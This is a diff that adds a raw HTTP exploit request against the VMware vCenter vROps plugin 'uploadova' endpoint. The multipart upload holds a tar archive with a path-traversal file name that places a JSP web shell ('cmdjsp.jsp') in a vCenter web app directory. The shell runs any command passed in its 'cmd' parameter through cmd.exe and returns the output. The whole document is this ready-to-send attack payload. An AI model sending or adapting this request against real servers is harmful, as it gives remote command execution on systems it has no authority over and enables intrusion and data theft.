@@ -1,0 +1,39 @@
+POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1
+Host: vulnerablehost
+Connection: close
+Accept: application/json
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH8GoragzRFVTw1VD
+Content-Length: 1200
+
+------WebKitFormBoundaryH8GoragzRFVTw1VD
+Content-Disposition: form-data; name="uploadFile"; filename="a.ova"
+Content-Type: text/plain
+
+././@LongLink0000000000000000000000000000015300000000000011214 Lustar  00000000000000..\..\..\..\..\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\cmdjsp.jsp..\..\..\..\..\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\cmdj0000644000076500000240000000115314033072161034302 0ustar  muratstaff00000000000000<FORM METHOD=GET ACTION='cmdjsp.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) {
+            output += s;
+         }
+      }
+      catch(IOException e) {
+         e.printStackTrace();
+      }
+   }
+%>
+
+<pre>
+<%=output %>
+</pre>
+------WebKitFormBoundaryH8GoragzRFVTw1VD--s
